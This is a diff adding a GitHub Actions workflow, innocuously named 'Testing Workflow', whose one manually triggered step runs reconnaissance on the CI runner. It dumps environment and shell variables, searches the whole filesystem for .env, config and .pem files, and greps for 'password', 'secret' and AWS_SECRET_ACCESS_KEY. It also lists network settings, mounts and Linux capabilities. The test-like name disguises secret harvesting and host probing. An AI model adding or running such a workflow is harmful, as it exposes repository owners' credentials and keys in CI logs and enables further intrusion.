@@ -1,0 +1,39 @@
+name: Testing Workflow
+
+on:
+  workflow_dispatch:
+
+jobs:
+  execute:
+    runs-on: ubuntu-latest
+    name: Execute Commands
+    steps:
+      - name: Init Command
+        run: |
+          uname -a                       # Kernel version
+          cat /etc/os-release            # OS information
+          hostname                       # Hostname
+          whoami                         # Current user
+          id 
+          env                            # Environment variables
+          printenv                       # Same as above
+          set                            # Shell variables (can include secrets)
+          mount                          # Mounted file systems
+          df -h                          # Disk space usage
+          ls /mnt /media /data           # Common mount points
+          ls -la /                       # Look at root directory
+          find / -type f -name "*.env"   # Search for environment files
+          find / -type f -name "config*" # Search for config files
+          ip a                           # IP addresses
+          ss -tuln                       # More modern alternative
+          cat /etc/hosts                 # Hostname resolution
+          cat /etc/resolv.conf           # DNS configuration
+          grep -r "password" /           # Find password references
+          grep -r "secret" /             # Find secrets
+          grep -r "AWS_SECRET_ACCESS_KEY" / # Common AWS key
+          find / -type f -name "*.pem"   # Look for private keys
+          capsh --print                        # Print Linux capabilities
+          getcap -r /                         # Find files with special capabilities
+          cat /proc/self/status | grep Cap    # Capabilities in effect
+          cat /proc/self/cgroup               # Control groups info
+      
